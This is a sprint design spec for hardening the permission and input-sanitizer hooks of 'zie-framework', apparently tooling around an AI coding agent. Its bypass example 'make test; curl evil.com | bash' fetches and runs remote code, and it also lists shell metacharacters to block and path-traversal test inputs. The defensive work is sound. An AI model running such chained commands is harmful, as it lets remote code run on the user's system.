---
approved: true
approved_at: 2026-03-27
backlog: batch — security-tmp-hardening, security-permissions-bypass, security-path-traversal, test-exec-module-safety, docs-sync-and-completeness, consolidate-utils-patterns, dead-code-cleanup, audit-weak-nocrash-assertions, test-quality-gaps
---

# Sprint 2: Security Hardening + Code Quality — Design Spec

**Problem:** zie-framework v1.10.1 has remaining issues across two themes: (A) security hardening — /tmp permission tests missing, permissions-bypass pattern anchoring, path traversal edge case tests; (B) code quality — fragile exec_module tests in auto-test + task-gate, dead code, shallow test assertions.

**Approach:** Single sprint, two parallel tracks. Track A (security, 3 items) and Track B (quality, 5 items) are independent and can be implemented in parallel. Version bump to v1.10.2 is deferred to the `/zie-release` step after implementation — do not bump VERSION during the sprint.

**Components:**

Track A — Security:
- `tests/unit/test_utils_write_permissions.py` — new test file: verify atomic_write/safe_write_tmp/safe_write_persistent produce 0o600 files
- `hooks/sdlc-permissions.py` — anchor all 10 SAFE_PATTERNS with `\s*$`; add literal metachar guard
- `hooks/input-sanitizer.py` — add 3 missing edge case tests (no code change needed)

Track B — Quality:
- `hooks/utils.py` — add `is_zie_initialized()` and `get_project_name()` helpers (net-new)
- `hooks/notification-log.py` — remove idle-log write block (lines 79–81); also remove `idle_prompt` matcher from `hooks/hooks.json`
- `hooks/sdlc-compact.py` — remove dead `if __name__ == "__main__": pass`
- `tests/unit/test_hooks_auto_test.py` — replace exec_module with subprocess at lines 88–91 and 316–319
- `tests/unit/test_hooks_task_completed_gate.py` — replace exec_module with subprocess at lines 210–215
- `tests/unit/test_hooks_wip_checkpoint.py` — add counter file side-effect assertion
- `tests/unit/test_hooks_auto_test.py:179,616` — replace bare `except: pass` with specific types
- `zie-framework/` — update PROJECT.md version; add README Skills section

**Note on already-completed items (not re-implementing):**
- /tmp permissions (atomic_write, safe_write_*): already use NamedTemporaryFile + 0o600 — this sprint adds test coverage only
- load_config migration: all 5 hooks (auto-test, session-resume, sdlc-compact, task-completed-gate, safety_check_agent) already use utils.load_config() — no migration needed
- safety_check_agent importlib: already imports BLOCKS directly from utils — no change needed
- is_relative_to() path traversal: already in use — this sprint adds edge case tests only

**Data Flow:**

**A1 — /tmp permissions tests**
- Add `tests/unit/test_utils_write_permissions.py` with 3 tests:
  1. `safe_write_tmp(path, content)` → assert `oct(path.stat().st_mode)[-3:] == "600"`
  2. `safe_write_persistent(path, content)` → same assertion
  3. `atomic_write(path, content)` → same assertion
- No code change to utils.py needed; behavior already correct

**A2 — sdlc-permissions bypass fix (sdlc-permissions.py)**
- Current: `re.match(r'make test', cmd)` — matches `make test; curl evil.com | bash`
- Fix 1: append `\s*$` anchor to ALL 9 SAFE_PATTERNS (lines 12–23): e.g., `re.match(r'make test\s*$', cmd)`
- Fix 2: add literal metachar guard before the pattern loop: if cmd contains any of `;`, `&&`, `||`, `|`, `` ` ``, `$(` → skip all patterns and fall through to manual prompt. No quote-aware parsing — any appearance of these characters rejects auto-approval.
- Result: only pure single commands get auto-approved

**A3 — Path traversal edge case tests (input-sanitizer.py)**
- Code already uses `abs_path.is_relative_to(cwd)` — no change
- Add 3 tests to `tests/unit/test_input_sanitizer.py`:
  1. `/home/user-evil/file.txt` with `cwd=/home/user` → path correctly rejected
  2. Path with embedded NUL byte → rejected before is_relative_to check
  3. `..` traversal: `cwd/../../etc/passwd` → rejected

**B1 — utils helpers (utils.py)**
- Add `is_zie_initialized(cwd: Path) -> bool` → `return (cwd / "zie-framework").exists()` — net-new
- Add `get_project_name(cwd: Path) -> str` → `return safe_project_name(cwd.name)` — net-new
- These are additive; no existing callers change in this sprint

**B2 — Dead code removal**
- Remove `notification-log.py` idle-log write: remove the entire `elif notification_type == "idle_prompt":` block (lines 79–81 inclusive). Also remove the `idle_prompt` Notification matcher block from `hooks/hooks.json` — the `idle_prompt` block is the second entry under `"Notification"` (the block starting with `{"matcher": "idle_prompt", ...}`). Keep the `permission_prompt` matcher block untouched.
- Remove `sdlc-compact.py` dead `if __name__ == "__main__": pass` block
- Note: `skills/zie-audit/SKILL.md` is NOT dead — it is actively invoked by `/zie-audit` command. The `dead-code-cleanup` backlog item's mention of the audit skill is incorrect. Do not delete it.

**B3 — Test quality (exec_module replacement + bare except + no-crash assertions)**
- `test_hooks_auto_test.py`: replace `importlib.util.spec_from_file_location / exec_module` at lines 88–91 and 316–319 with `subprocess.run([sys.executable, HOOK], input=json.dumps(event), capture_output=True, text=True)` — consistent with all other hook tests
- `test_hooks_task_completed_gate.py`: replace exec_module at lines 210–215 with subprocess pattern
- `test_hooks_auto_test.py:179,616`: replace bare `except:` with `except Exception as e:` and `print(f"[test] caught: {e}")`
- `test_hooks_wip_checkpoint.py`: `test_counter_increments_each_call` (line 91) already asserts `counter.exists()` and `int(counter.read_text().strip()) == 3` — the side-effect assertion is already present. Verify this test passes; no new code needed for this item.

**B4 — Docs sync**
- `PROJECT.md`: run `make sync-version` to update version field to current VERSION
- `README.md`: add Skills section listing all active skills with one-line descriptions
- `CLAUDE.md` Optional Dependencies table: already added in Sprint 1 — verify present and complete (pytest, coverage, playwright, zie-memory)

**Acceptance Criteria:**

1. **Permissions tests** — `test_utils_write_permissions.py` exists; 3 tests pass verifying `0o600` on safe_write_tmp, safe_write_persistent, atomic_write
2. **Permissions bypass** — `make test; curl evil.com` does NOT get auto-approved; `make test | grep foo` also falls through
3. **Path traversal** — `/home/user-evil/`, NUL byte, and `..` traversal tests all pass (3 total)
4. **Dead code** — idle-log write block removed from notification-log.py; idle_prompt matcher removed from hooks.json; `__main__` block removed from sdlc-compact.py
5. **utils helpers** — `is_zie_initialized()` and `get_project_name()` exist in utils.py
6. **Test patterns** — exec_module replaced with subprocess in test_hooks_auto_test.py and test_hooks_task_completed_gate.py; bare except replaced
7. **No-crash assertions** — `test_hooks_wip_checkpoint.py::test_counter_increments_each_call` passes (asserts counter file exists with integer value)
8. **Docs** — PROJECT.md version current; README has Skills section; CLAUDE.md Optional Dependencies complete (pytest, coverage, playwright, zie-memory)
9. **All existing tests pass** — `make test-unit` green

**Edge Cases:**
- `sdlc-permissions.py` metachar check: `make test | grep foo` — pipe char present → falls through to manual approval (correct)
- `is_relative_to()` — Python ≥3.9; project already on Python 3.x; no issue
- idle_prompt hooks.json removal: remove only the `idle_prompt` notification matcher; keep `permission_prompt`
- wip-checkpoint test: counter file path is `persistent_project_path("edit-count", cwd.name)` — test must configure env so hook resolves a consistent cwd

**Out of Scope:**
- Full sitecustomize installation (deferred)
- Replacing all `get_cwd().name` with `get_project_name()` everywhere (large refactor, separate sprint)
- Git status caching (architecture-cleanup sprint)
- Async hook marking (architecture-cleanup sprint)
